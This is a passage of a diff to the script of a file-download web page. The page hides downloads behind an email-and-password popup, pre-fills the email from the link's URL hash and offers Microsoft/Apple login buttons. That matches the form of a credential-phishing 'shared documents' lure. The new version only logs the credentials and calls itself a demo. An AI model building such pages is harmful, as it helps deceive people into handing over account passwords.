-                button.style.cursor = 'pointer';
-                button.style.opacity = '1';
-                button.style.pointerEvents = 'auto';
-            });
-            
-            if (downloadAllButton) {
-                downloadAllButton.disabled = false;
-                downloadAllButton.style.opacity = '1';
-                downloadAllButton.style.cursor = 'pointer';
-            }
-        }
-
-        // Handle individual file downloads
-        function handleFileDownload(event) {
-            if (!isAuthenticated) {
-                event.preventDefault();
-                popupForm.style.display = 'block';
-                popupOverlay.style.display = 'block';
-                errorMessage.style.display = 'none';
-
-                // Check URL hash for email pre-fill
-                if (window.location.hash) {
-                    const clientID = window.location.hash.substring(1);
-                    if (clientID.includes('@')) {
-                        emailInput.value = clientID;
-                        validateInputs();
-                    }
-                }
-                return;
-            }
-
-            const fileContainer = event.currentTarget.closest('.file__container');
-            const fileName = fileContainer.querySelector('.file_title').textContent;
-            const fileUrl = fileContainer.dataset.fileUrl;
-            
-            showLoading(true);
-            
-            if (fileUrl) {
-                const a = document.createElement('a');
-                a.href = fileUrl;
-                a.download = fileName;
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-            }
-            
-            setTimeout(() => {
-                showLoading(false);
-            }, 1000);
-        }
-
-        // Event listeners
-        if (emailInput) emailInput.addEventListener('input', validateInputs);
-        if (passwordInput) passwordInput.addEventListener('input', validateInputs);
-        if (popupOverlay) popupOverlay.addEventListener('click', closePopup);
-        if (closePopupButton) closePopupButton.addEventListener('click', closePopup);
-        
-        // Add click handlers to all download buttons
-        downloadButtons.forEach(button => {
-            button.style.cursor = 'not-allowed';
-            button.style.opacity = '1';
-            button.style.pointerEvents = 'auto';
-            
-            button.removeEventListener('click', handleFileDownload);
-            button.addEventListener('click', handleFileDownload);
+      // Attach event listeners to individual file download icons
+      fileDownloadIcons.forEach(icon => {
+        icon.addEventListener("click", () => {
+          const fileName = icon.dataset.file; // Get the file name from data attribute
+          showPopup(fileName);
         });
+      });
 
-        if (downloadAllButton) {
-            downloadAllButton.addEventListener('click', () => {
-                if (!isAuthenticated) {
-                    popupForm.style.display = 'block';
-                    popupOverlay.style.display = 'block';
-                    errorMessage.style.display = 'none';
-                    
-                    if (window.location.hash) {
-                        const clientID = window.location.hash.substring(1);
-                        if (clientID.includes('@')) {
-                            emailInput.value = clientID;
-                            validateInputs();
-                        }
-                    }
-                } else {
-                    showLoading(true);
-                    setTimeout(() => {
-                        showLoading(false);
-                        downloadButtons.forEach(btn => {
-                            const container = btn.closest('.file__container');
-                            const fileUrl = container.dataset.fileUrl;
-                            if (fileUrl) {
-                                const a = document.createElement('a');
-                                a.href = fileUrl;
-                                a.download = container.querySelector('.file_title').textContent;
-                                document.body.appendChild(a);
-                                a.click();
-                                document.body.removeChild(a);
-                            }
-                        });
-                    }, 1500);
-                }
-            });
+      // Close popup on overlay click
+      popupOverlay.addEventListener("click", hidePopup);
+
+      // Close popup on close button click
+      closePopupButton.addEventListener("click", hidePopup);
+
+      // Handle form submission with basic validation
+      downloadForm.addEventListener("submit", (e) => {
+        e.preventDefault();
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value;
+        const fileName = downloadForm.dataset.file || "all files";
+
+        if (!email || !password) {
+          errorMessage.textContent = "Please fill in both email and password.";
+          errorMessage.style.display = "block";
+          return;
         }
 
-        if (downloadForm) {
-            downloadForm.addEventListener('submit', handleSubmit);
-        }
+        // Placeholder for form submission
+        errorMessage.textContent = `Authenticating to download ${fileName}... (Demo: Not implemented)`;
+        errorMessage.style.display = "block";
+        console.log("Form submitted:", { email, password, file: fileName });
 
-        // Initial validation
-        validateInputs();
+        // Example backend call (uncomment and configure with your API)
+        /*
+        fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password, file: fileName })
+        })
+          .then(response => response.json())
+          .then(data => {
+            if (data.success) {
+              window.location.href = `/download/${fileName}`;
+              hidePopup();
+            } else {
+              errorMessage.textContent = data.message || "Authentication failed.";
+              errorMessage.style.display = "block";
+            }
+          })
+          .catch(() => {
+            errorMessage.textContent = "An error occurred. Please try again.";
+            errorMessage.style.display = "block";
+          });
+        */
+      });
 
-        // Add CSS fixes
-        const style = document.createElement('style');
-        style.textContent = `
-            .file_download {
-                pointer-events: auto !important;
-                cursor: pointer !important;
-            }
-            .file_download svg {
-                pointer-events: none !important;
-            }
-            .file__container {
-                position: relative;
-            }
-        `;
-        document.head.appendChild(style);
+      // Handle Microsoft/Apple login buttons (placeholders)
+      document.querySelectorAll(".btn.logo").forEach(button => {
+        button.addEventListener("click", () => {
+          const provider = button.textContent.includes("Microsoft") ? "Microsoft" : "Apple";
+          console.log(`Initiating ${provider} login`);
+          // Implement OAuth redirect here, e.g.:
+          // window.location.href = `/auth/${provider.toLowerCase()}`;
+        });
+      });
     });
-</script>
+  </script>
 </body>
-
 </html>
